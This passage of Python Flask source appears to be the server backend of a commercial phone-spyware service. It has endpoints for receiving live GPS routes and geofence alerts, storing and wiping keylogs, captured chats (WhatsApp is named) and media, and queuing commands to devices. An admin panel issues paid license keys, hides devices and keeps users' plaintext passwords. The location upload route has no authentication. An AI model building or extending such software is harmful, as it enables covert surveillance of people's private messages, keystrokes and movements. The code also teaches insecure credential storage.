        update_device_record(device_id, "logs", f"Sent command: {cmd}")
        return jsonify({'success': True})
    else:
        if cmd in ['START_LOCK_TRACK', 'STOP_LOCK_TRACK', 'START_NOTIFS', 'STOP_NOTIFS', 'TOGGLE_NOTIFS']:
            return jsonify({'success': True, 'queued': True})
        return jsonify({'success': False, 'error': 'Device offline'}), 400

@app.route('/api/device/<device_id>/clear_route', methods=['POST'])
@login_required
def api_device_clear_route(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database:
        return jsonify({"success": False, "error": "Device not found"}), 404
        
    req_data = request.json or {}
    target_date = req_data.get('date', 'today')
    
    if target_date == 'today':
        database[device_id]['today_route'] = []
        update_device_record(device_id, "logs", "Cleared today's route log")
    else:
        history = database[device_id].get('route_history', [])
        new_history = [item for item in history if item.get('date') != target_date]
        database[device_id]['route_history'] = new_history
        update_device_record(device_id, "logs", f"Deleted route history for {target_date}")
        
    save_db()
    return jsonify({"success": True})

@app.route('/api/device/<device_id>/location', methods=['POST'])
def api_device_location(device_id):
    data = request.json
    if not data:
        return jsonify({"success": False, "error": "Invalid JSON payload"}), 400
        
    lat = data.get("lat")
    lng = data.get("lng")
    upload_time = data.get("time", int(time.time() * 1000))
    
    if lat is None or lng is None:
        return jsonify({"success": False, "error": "Coordinates missing"}), 400
        
    if device_id not in database:
        database[device_id] = {"_id": device_id}
        
    settings = database.get(device_id, {}).get("settings", {})
    info = database.get(device_id, {}).get("info", {})
    
    if settings.get("lock_track_enabled", False) or info.get("lock_track_enabled") == "true":
        today_route = database[device_id].get("today_route", [])
        current_time = time.localtime(upload_time / 1000)
        current_date_str = time.strftime("%Y-%m-%d", current_time)
        today_route_date = database[device_id].get("today_route_date", current_date_str)
        
        if today_route_date != current_date_str:
            if today_route:
                route_history = database[device_id].get("route_history", [])
                route_history.append({
                    "date": today_route_date,
                    "route": today_route
                })
                database[device_id]["route_history"] = route_history[-30:]
            today_route = []
            database[device_id]["today_route_date"] = current_date_str
            
        today_route.append({
            "lat": lat,
            "lng": lng,
            "time": upload_time
        })
        database[device_id]["today_route"] = today_route
        database[device_id]["today_route_date"] = current_date_str
        
    update_device_record(device_id, "location", data)
    check_geofences_for_device(device_id, data)
    
    # Forward the live update event to dashboard
    socketio.emit('location_update', {
        'device_id': device_id,
        'lat': lat,
        'lng': lng,
        'time': upload_time
    })
    
    return jsonify({"success": True})

@app.route('/api/device/<device_id>/geofence/add', methods=['POST'])
@login_required
def add_geofence(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    
    data = request.json
    if not data:
        return jsonify({"success": False, "error": "Invalid data"}), 400
        
    lat = data.get("lat")
    lng = data.get("lng")
    radius = data.get("radius")
    name = data.get("name", "Unknown Fence")
    fence_type = data.get("type", "allowed")
    
    if lat is None or lng is None or radius is None:
        return jsonify({"success": False, "error": "Coordinates/radius missing"}), 400
        
    if device_id not in database:
        database[device_id] = {"_id": device_id}
        
    if "settings" not in database[device_id]:
        database[device_id]["settings"] = {}
        
    if "geofences" not in database[device_id]["settings"]:
        database[device_id]["settings"]["geofences"] = []
        
    fence_id = str(int(time.time() * 1000))
    new_fence = {
        "id": fence_id,
        "lat": float(lat),
        "lng": float(lng),
        "radius": int(radius),
        "name": str(name),
        "type": str(fence_type)
    }
    
    database[device_id]["settings"]["geofences"].append(new_fence)
    save_db()
    
    update_device_record(device_id, "logs", f"Added geofence zone: '{name}' ({fence_type.upper()})")
    
    return jsonify({"success": True, "fence": new_fence})

@app.route('/api/device/<device_id>/geofence/delete/<fence_id>', methods=['POST'])
@login_required
def delete_geofence(device_id, fence_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
        
    if device_id in database and "settings" in database[device_id] and "geofences" in database[device_id]["settings"]:
        geofences = database[device_id]["settings"]["geofences"]
        fence = next((f for f in geofences if f.get("id") == fence_id), None)
        name = fence.get("name", "Unknown") if fence else "Unknown"
        
        database[device_id]["settings"]["geofences"] = [f for f in geofences if f.get("id") != fence_id]
        
        if "last_geofence_states" in database[device_id] and fence_id in database[device_id]["last_geofence_states"]:
            database[device_id]["last_geofence_states"].pop(fence_id)
            
        save_db()
        update_device_record(device_id, "logs", f"Deleted geofence zone: '{name}'")
        return jsonify({"success": True})
        
    return jsonify({"success": False, "error": "Geofence not found"}), 404

@app.route('/api/device/<device_id>/clear_keylogs', methods=['POST'])
@login_required
def clear_keylogs(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database:
        database[device_id]["keylogs"] = {}
        save_db()
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/clear_notif_pending', methods=['POST'])
@login_required
def clear_notif_pending(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database:
        if "info" not in database[device_id]:
            database[device_id]["info"] = {}
        database[device_id]["info"]["notif_pending"] = "0"
        save_db()
        socketio.emit('device_status_change', {'device_id': device_id})
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Device not found'}), 404

@app.route('/api/device/<device_id>/delete_media/<media_key>', methods=['POST'])
@login_required
def delete_media(device_id, media_key):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database and "media" in database[device_id]:
        m = database[device_id]["media"].pop(media_key, None)
        if m and "path" in m:
            try:
                os.remove(m["path"])
            except: pass
        save_db()
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Media or device not found'}), 404

@app.route('/api/device/<device_id>/clear_chats', methods=['POST'])
@login_required
def clear_chats(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    req_json = request.json or {}
    platform = req_json.get('platform')
    contact = req_json.get('contact')
    
    if device_id in database and "chats" in database[device_id]:
        if platform:
            platform_key = platform.replace(".", "_")
            if contact:
                contact_key = contact.replace(".", "_").replace(" ", "_")
                # Wipe specific contact chats
                if platform_key in database[device_id]["chats"]:
                    database[device_id]["chats"][platform_key].pop(contact_key, None)
            else:
                # Wipe entire platform (e.g. WhatsApp / com_whatsapp)
                database[device_id]["chats"].pop(platform_key, None)
        else:
            # Wipe all social media data
            database[device_id]["chats"] = {}
        save_db()
        # Broadcast socket event to trigger UI reload
        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform or '',
            'contact': contact or '',
            'text': '',
            'isSent': False,
            'time': 0
        })
    return jsonify({'success': True})


# --- Admin Panel & APIs ---
@app.route('/admin')
@admin_required
def admin_panel_view():
    return render_template('admin.html')

@app.route('/api/admin/list_users_keys', methods=['GET'])
@admin_required
def admin_list_users_keys():
    users_list = []
    for username, u_info in users_database.get("users", {}).items():
        user_licenses = []
        for l_key, l_info in users_database.get("licenses", {}).items():
            if l_info.get("assigned_to") == username:
                user_licenses.append({
                    "key": l_key,
                    "expires_at": l_info.get("expires_at", 0),
                    "is_active": l_info.get("is_active", True)
                })
        
        device_details = []
        for dev_id in u_info.get("devices", []):
            is_online = dev_id in connected_devices
            is_hidden = dev_id in u_info.get("hidden_devices", [])
            model = database.get(dev_id, {}).get("info", {}).get("model", dev_id)
            device_details.append({
                "id": dev_id,
                "model": model,
                "online": is_online,
                "hidden": is_hidden
            })
            
        users_list.append({
            "username": username,
            "plain_password": u_info.get("plain_password", "******"),
            "last_seen": u_info.get("last_seen", 0),
            "licenses": user_licenses,
            "devices": device_details
        })
            
    return jsonify({
        "success": True,
        "users": users_list,
        "system_policy": users_database.get("system_policy", {})
    })

@app.route('/api/admin/create_user', methods=['POST'])
@admin_required
def admin_create_user():
    data = request.json or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    
    if not username or not password:
        return jsonify({"success": False, "error": "Username and password are required"}), 400
        
    if username in users_database.get("users", {}):
        return jsonify({"success": False, "error": "User already exists"}), 400
        
    users_database["users"][username] = {
        "password_hash": hash_password(password),
        "plain_password": password,
        "role": "user",
        "devices": [],
        "hidden_devices": []
    }
    save_users_db()
    return jsonify({"success": True, "message": "User created successfully"})

@app.route('/api/admin/delete_user', methods=['POST'])
@admin_required
def admin_delete_user():
    data = request.json or {}
    username = data.get('username', '').strip()
    
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
        
    if username not in users_database.get("users", {}):
        return jsonify({"success": False, "error": "User not found"}), 404
        
    # Remove associated licenses
    keys_to_del = [k for k, v in users_database.get("licenses", {}).items() if v.get("assigned_to") == username]
    for k in keys_to_del:
        users_database["licenses"].pop(k, None)
        
    # Delete user record
    users_database["users"].pop(username, None)
    save_users_db()
    return jsonify({"success": True, "message": f"User '{username}' and associated licenses deleted permanently."})

@app.route('/api/admin/generate_license', methods=['POST'])
@admin_required
def admin_generate_license():
    data = request.json or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    license_key = data.get('license_key', '').strip()
    duration_days = data.get('duration_days')
    
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
        
    # Check if we are modifying an existing user or creating a new one
    user_info = users_database.get("users", {}).get(username)
    if not user_info:
        # Create user
        if not password:
            return jsonify({"success": False, "error": "Password is required for new user creation"}), 400
        users_database["users"][username] = {
            "password_hash": hash_password(password),
            "plain_password": password,
            "role": "user",
            "devices": [],
            "hidden_devices": []
        }
        user_info = users_database["users"][username]
    else:
        # Update user password if provided
        if password:
            user_info["password_hash"] = hash_password(password)
            user_info["plain_password"] = password

    # 1. Determine key to assign
    if not license_key:
        # Check if the user already has a key assigned
        existing_keys = [k for k, v in users_database.get("licenses", {}).items() if v.get("assigned_to") == username]
        if existing_keys:
            license_key = existing_keys[0]
        else:
            # Auto-generate a new key
            import random
            import string
            chars = string.ascii_uppercase + string.digits
            part1 = ''.join(random.choice(chars) for _ in range(4))
            part2 = ''.join(random.choice(chars) for _ in range(4))
            part3 = ''.join(random.choice(chars) for _ in range(4))
            part4 = ''.join(random.choice(chars) for _ in range(4))
            license_key = f"CYBER-{part1}-{part2}-{part3}-{part4}"

    # 2. Check if this key already exists
    lic_info = users_database.get("licenses", {}).get(license_key)
    current_ts = int(time.time())

    # 3. Calculate expiration
    # Handle custom dropdown parameters like "+7 Days"
    if str(duration_days).startswith("+"):
        days_to_add = int(str(duration_days).replace("+", "").replace("d", "").strip())
        if lic_info:
            base_exp = max(lic_info.get("expires_at", current_ts), current_ts)
        else:
            base_exp = current_ts
        expires_at = base_exp + (days_to_add * 86400)
    else:
        try:
            days = int(duration_days)
        except:
            days = 30
        expires_at = current_ts + (days * 86400)

    # 4. If user already had another key, remove the old one to avoid duplicates
    old_keys = [k for k, v in users_database.get("licenses", {}).items() if v.get("assigned_to") == username and k != license_key]
    for k in old_keys:
        users_database["licenses"].pop(k, None)

    # 5. Save license
    created_ts = lic_info.get("created_at", current_ts) if lic_info else current_ts
    users_database["licenses"][license_key] = {
        "assigned_to": username,
        "expires_at": expires_at,
        "is_active": True,
        "created_at": created_ts
    }
    
    # 6. Auto-map already connected devices matching this key
    for dev_id, l_key in list(connected_device_licenses.items()):
        if l_key == license_key:
            if "devices" not in users_database["users"][username]:
                users_database["users"][username]["devices"] = []
            if dev_id not in users_database["users"][username]["devices"]:
                users_database["users"][username]["devices"].append(dev_id)
                print(f"[RBAC] Auto-mapped already connected device {dev_id} to user {username} on key save")
                
    save_users_db()
    return jsonify({
        "success": True, 
        "message": "User and license updated successfully",
        "license_key": license_key, 
        "expires_at": expires_at
    })

@app.route('/api/admin/toggle_license_active', methods=['POST'])
@admin_required
def admin_toggle_license_active():
    data = request.json or {}
    username = data.get('username', '').strip()
    is_active = data.get('is_active', True)
    
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
        
    found = False
    for l_key, l_info in users_database.get("licenses", {}).items():
        if l_info.get("assigned_to") == username:
            l_info["is_active"] = is_active
            found = True
            
    if not found:
        return jsonify({"success": False, "error": "No licenses found for this user"}), 404
        
    save_users_db()
    action = "activated" if is_active else "suspended"
    return jsonify({"success": True, "message": f"License successfully {action}."})

@app.route('/api/admin/apply_maintenance', methods=['POST'])
@admin_required
def admin_apply_maintenance():
    data = request.json or {}
    enabled = data.get('enabled', False)
    message = data.get('message', '').strip()
    
    policy = users_database.get("system_policy", {})
    policy["maintenance_mode"] = enabled
    if message:
        policy["maintenance_message"] = message
        
    users_database["system_policy"] = policy
    save_users_db()
    
    if enabled:
        # Force reload active normal users dashboards to show maintenance screen
        socketio.emit('system_maintenance', {"message": policy["maintenance_message"]})
    else:
        # Notify clients that maintenance has ended
        socketio.emit('maintenance_end', {})
        
    return jsonify({"success": True, "message": "System policy updated successfully"})

@app.route('/api/admin/bulk_op', methods=['POST'])
@admin_required
def admin_bulk_op():
    action = request.json.get('action')
    if not action:
        return jsonify({"success": False, "error": "Action is required"}), 400
        
    current_ts = int(time.time())
    
    if action == "force_logout":
        # Broadcast force logout event to all user dashboards
        socketio.emit('force_logout_all', {})
        return jsonify({"success": True, "message": "Force logout broadcast sent."})
        
    elif action == "extend_all":
        # Extend all licenses by 7 days
        for l_key, l_info in users_database.get("licenses", {}).items():
            base_exp = max(l_info.get("expires_at", current_ts), current_ts)
            l_info["expires_at"] = base_exp + (7 * 86400)
        save_users_db()
        return jsonify({"success": True, "message": "All licenses extended by 7 days."})
        
    elif action == "suspend_all":
        # Deactivate all licenses
        for l_key, l_info in users_database.get("licenses", {}).items():
            l_info["is_active"] = False
        save_users_db()
        return jsonify({"success": True, "message": "All licenses suspended."})
        
    elif action == "activate_all":
        # Activate all licenses
        for l_key, l_info in users_database.get("licenses", {}).items():
            l_info["is_active"] = True
        save_users_db()
        return jsonify({"success": True, "message": "All licenses activated."})
        
    return jsonify({"success": False, "error": "Invalid bulk action"}), 400

@app.route('/api/admin/toggle_device_visibility', methods=['POST'])
@admin_required
def admin_toggle_device_visibility():
    data = request.json or {}
    username = data.get('username', '').strip()
    device_id = data.get('device_id', '').strip()
    
    if not username or not device_id:
        return jsonify({"success": False, "error": "Username and device_id are required"}), 400
        
    user_info = users_database.get("users", {}).get(username)
    if not user_info:
        return jsonify({"success": False, "error": "User not found"}), 404
        
    if "hidden_devices" not in user_info:
        user_info["hidden_devices"] = []
        
    if device_id in user_info["hidden_devices"]:
        user_info["hidden_devices"].remove(device_id)
        action = "unhidden"
    else:
        user_info["hidden_devices"].append(device_id)
        action = "hidden"
        
    save_users_db()
    
    # Notify dashboard of device visibility change
    socketio.emit('device_status_change', {'device_id': device_id})
    return jsonify({"success": True, "action": action})

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login_page():
    if request.method == 'POST':
        data = request.json or {}
        username = data.get('username')
        password = data.get('password')
        if username == ADMIN_EMAIL and check_password(password, ADMIN_PASSWORD_HASH):
            session['username'] = username
            session['admin_logged'] = True
            return jsonify({'success': True, 'redirect': url_for('admin_panel_view')})
        return jsonify({'success': False, 'error': 'Invalid admin credentials.'}), 401
    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('username', None)
    session.pop('admin_logged', None)
    return jsonify({'success': True, 'redirect': url_for('login_page')})

# --- USER DETAILS & SUPPORT TICKETS API ---
@app.route('/api/user/details')
@login_required
def user_details_api():
    username = session.get('username')
    license_key = session.get('license_key')
    if not license_key:
        return jsonify({"success": False, "error": "No active license in session."}), 400
    lic_info = users_database.get("licenses", {}).get(license_key)
    if not lic_info:
        return jsonify({"success": False, "error": "License not found in database."}), 404
    
    current_ts = int(time.time())
    expires_at = lic_info.get("expires_at", 0)
    created_at = lic_info.get("created_at", expires_at - 30 * 86400)
    days_remaining = max(0, int((expires_at - current_ts) / 86400))
    
    return jsonify({
        "success": True,
        "username": username,
        "license_key": license_key,
        "created_at": created_at,
        "expires_at": expires_at,
        "days_remaining": days_remaining,
        "is_active": lic_info.get("is_active", True)
    })

@app.route('/api/user/report_issue', methods=['POST'])
@login_required
def user_report_issue():
    data = request.json or {}
    issue_text = data.get("issue_text", "").strip()
    if not issue_text:
        return jsonify({"success": False, "error": "Issue description cannot be empty."}), 400
    
    if "reports" not in users_database:
        users_database["reports"] = []
        
    import random
    import string
    chars = string.ascii_uppercase + string.digits
    report_id = "REP-" + "".join(random.choice(chars) for _ in range(6))
    
    new_report = {
        "id": report_id,
        "username": session.get('username'),
        "license_key": session.get('license_key'),
        "issue_text": issue_text,
        "timestamp": int(time.time()),
        "status": "pending"
    }
    users_database["reports"].append(new_report)
    save_users_db()
    return jsonify({"success": True, "message": "Issue reported successfully. Support team will contact you.", "report_id": report_id})

@app.route('/api/admin/list_reports')
@admin_required
def admin_list_reports():
    reports = users_database.get("reports", [])
    return jsonify({"success": True, "reports": reports})

@app.route('/api/admin/resolve_report', methods=['POST'])
@admin_required
def admin_resolve_report():
    data = request.json or {}
    report_id = data.get("report_id")
    action = data.get("action") # "resolve", "delete"
    if not report_id:
        return jsonify({"success": False, "error": "Report ID is required."}), 400
        
    reports = users_database.get("reports", [])
    found = False
    for rep in reports:
        if rep.get("id") == report_id:
            found = True
            if action == "resolve":
                rep["status"] = "resolved"
            elif action == "pending":
                rep["status"] = "pending"
            elif action == "delete":
                reports.remove(rep)
            break
            
    if not found:
        return jsonify({"success": False, "error": "Report not found."}), 404
        
    users_database["reports"] = reports
    save_users_db()
    return jsonify({"success": True, "message": f"Report action '{action}' completed."})


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
